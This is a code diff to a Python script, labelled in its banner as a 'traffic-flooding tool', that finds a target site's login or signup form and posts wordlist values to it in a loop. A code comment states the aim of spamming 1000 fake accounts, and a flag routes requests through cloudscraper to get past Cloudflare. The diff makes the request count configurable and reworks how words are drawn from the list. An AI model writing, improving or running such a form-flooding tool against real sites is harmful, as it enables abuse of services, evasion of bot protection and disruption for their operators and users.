@@ -6,6 +6,7 @@ import sys, os
 import argparse
 import random
 import cloudscraper
+import itertools
 
 banner = """
 -=[ traffic-flooding tool ]=-
@@ -26,6 +27,11 @@ parser.add_argument(
     action="store_true",
     help="bypass cloudflare"
 )
+parser.add_argument(
+    "-c", "--count",
+    type=int,
+    default=1000
+)
 
 def pprint(text):
     now = time.strftime("%X")
@@ -33,9 +39,16 @@ def pprint(text):
 
 args = parser.parse_args()
 
-def main():
+def wordlist(pos,length,limit):
+    words = []
+    if(pos+length > limit):
+        pos = 0
     with open(args.wordlist,"r") as f:
-        words = f.read().splitlines()
+        for word in itertools.islice(f, pos, pos+length):
+            words.append(word)
+    return words, pos+length
+
+def main():
     session = cloudscraper.CloudScraper() if args.cf else requests.Session()
     r = session.get(args.url)
     soup = bs(r.text, "html5lib")
@@ -51,11 +64,11 @@ def main():
         # the form in minimum shouldve 2 input text and 1 submit button
         for inputx in inputs:
             if inputx.get("type") == "text" or inputx.get("type") == "password":
-                isfound += 1
                 try:
                     inputname.append(inputx.get("name"))
                 except AttributeError:
-                    pass
+                    continue
+                isfound += 1
         pprint(f"{isfound} input(s) found")
         if isfound >= 2:
             # were going to spam 1000 fake accounts
@@ -70,11 +83,17 @@ def main():
                 url = protocol+"//"+domain+"/"+endpoint
             else:
                 url = endpoint
-            for _ in range(1000):
+            wcount = 0
+            with open(args.wordlist,"r") as fd:
+                wordlen = sum(1 for _ in fd)
+            for _ in range(args.count):
                 filled = {}
+                words, wcount = wordlist(wcount, len(inputname), wordlen)
+                print(words)
                 for name in inputname:
-                    word = random.choice(words).strip()
-                    filled[name] = word
+                    word = random.choice(words)
+                    filled[name] = word.strip()
+                    words.remove(word)
                 r = session.post(url, data=filled)
                 if r.status_code == 200:
                     pprint(f"\x1b[1;92m{r.status_code} sent {str(filled)} to {args.url}\x1b[0m")
